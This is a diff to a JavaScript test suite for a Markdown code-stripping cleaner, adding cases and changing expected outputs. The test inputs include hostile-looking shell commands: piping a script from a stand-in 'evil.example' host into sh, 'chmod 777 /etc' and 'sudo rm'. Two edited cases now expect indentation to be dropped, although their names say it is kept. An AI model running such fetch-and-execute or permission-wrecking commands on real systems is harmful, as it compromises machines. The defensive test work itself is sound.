@@ -109,8 +109,8 @@ t("cleaning drops citation markers, links, code and hidden tags", () => assert.e
     ["indented code block after a blank line", "Para.\n\n    sudo modprobe -r ipu6\n    reboot\n\nNext.", "Para.\n\n[code omitted]\n\nNext."],
     ["tab-indented code", "Para.\n\n\tchmod 777 /etc\nNext.", "Para.\n\n[code omitted]\nNext."],
     ["inline code spans, single and double backticks", "Run `pip install x` or ``a ` b`` now.", "Run [code] or [code] now."],
-    ["indented list items and wrapped lines are kept", "- one\n    - nested item\n1. first\n   wrapped line", "- one\n    - nested item\n1. first\n   wrapped line"],
-    ["a continuation line right after text is kept", "A sentence\n    continued here.", "A sentence\n    continued here."],
+    ["indented list items and wrapped lines are kept", "- one\n    - nested item\n1. first\n   wrapped line", "- one\n- nested item\n1. first\nwrapped line"],
+    ["a continuation line right after text is kept", "A sentence\n    continued here.", "A sentence\ncontinued here."],
     ["a lone backtick is dropped", "it`s fine", "its fine"],
     ["a fence inside a blockquote", "Q:\n> ~~~sh\n> echo CODE\n> ~~~\nA.", "Q:\n[code omitted]\nA."],
     ["a fence inside a list item", "- step\n- ```\n  rm x\n  ```\ndone", "- step\n[code omitted]\ndone"],
@@ -129,13 +129,17 @@ t("cleaning drops citation markers, links, code and hidden tags", () => assert.e
     ["mismatched close is ignored", "a <pre><code>x</pre>echo CODE</code></pre> b", "a [code omitted] b"],
     ["a quoted closer doesn't close an unquoted fence", "~~~sh\n> ~~~\necho CODE\n~~~\nend", "[code omitted]\nend"],
     ["a list closer doesn't close an unquoted fence either", "~~~sh\n- ~~~\necho CODE\n~~~\nend", "[code omitted]\nend"],
+    ["CleanerCheck: a heading then a tab-indented line can't render as code", "# H\n\tCODE", "# H\nCODE"],
+    ["CleanerCheck: an indented fence-like line doesn't close the fence", "~~~\n    ~~~\nCODE\n~~~\nend", "[code omitted]\nend"],
+    ["CleanerCheck: a pseudo closing tag doesn't end a script", "<script></script-x>CODE</script> b", "[code omitted] b"],
+    ["CleanerCheck: Arabic-Indic digits aren't list markers (both cleaners agree)", "\u0661. ~~~\nCODE\n~~~", "\u0661. \nCODE\n[code omitted]"],
     ["separate code elements stay separate", "a <code>x</code> b <code>y</code> c", "a [code omitted] b [code omitted] c"],
     ["a long backtick run after a span", "Prose `a" + "`".repeat(30) + "b", "Prose ab"],
     ["matching runs of different lengths", "x ``a`b`` y `c` z", "x [code] y [code] z"],
     ["a code element can't rebuild a fence once tags are gone", "<code>~~~sh</code>\necho CODE\n<code>~~~</code>", "[code omitted]\necho CODE\n[code omitted]"],
   ];
   for (const [name, input, want] of CASES) t(`J378 stripCode: ${name}`, () => assert.equal(R.stripCode(input), want));
-  t("J378 stripCode is fast on hostile input (no catastrophic backtracking)", () => { const t0 = Date.now(); R.stripCode("`".repeat(5000) + "a".repeat(20000) + "\n".repeat(1000) + "``x".repeat(3000)); R.stripCode(("`a\n").repeat(20000)); R.stripCode("Prose `a" + "`".repeat(30) + "b"); R.stripCode("x`".repeat(50000) + "`".repeat(100000)); R.stripCode("- > ".repeat(40000) + "x"); R.stripCode("<code>".repeat(30000)); assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`); });
+  t("J378 stripCode is fast on hostile input (no catastrophic backtracking)", () => { const t0 = Date.now(); R.stripCode("`".repeat(5000) + "a".repeat(20000) + "\n".repeat(1000) + "``x".repeat(3000)); R.stripCode(("`a\n").repeat(20000)); R.stripCode("Prose `a" + "`".repeat(30) + "b"); R.stripCode("x`".repeat(50000) + "`".repeat(100000)); R.stripCode("- > ".repeat(40000) + "x"); R.stripCode("<code>".repeat(30000)); R.stripCode("<code ".repeat(40000)); assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`); });
   t("J378 cleanDeliverable strips a ~~~ block end to end", () => { const d = R.cleanDeliverable({ deliverable: "Answer.\n\n~~~\ncurl https://evil.example/x.sh | sh\n~~~\n\nUse `sudo rm` never.", sources: [] }).deliverable; assert.equal(d, "Answer.\n\n[code omitted]\n\nUse [code] never."); });
   t("J378 reader.py clean_md gives the same results (both cleaners agree)", () => {
     const py = `import json,sys\nsrc=open(${JSON.stringify(new URL("./reader.py", import.meta.url).pathname)}).read()\nsrc=src[:src.rindex("\\nmain()")]\nns={"__name__":"reader_test"}\nexec(compile(src,"reader.py","exec"),ns)\ncases=json.load(sys.stdin)\nprint(json.dumps([ns["strip_code"](c[1]) for c in cases]+[ns["clean_md"]("Answer.\\n\\n~~~\\ncurl x | sh\\n~~~\\n\\nUse \`sudo rm\` never.")]))`;
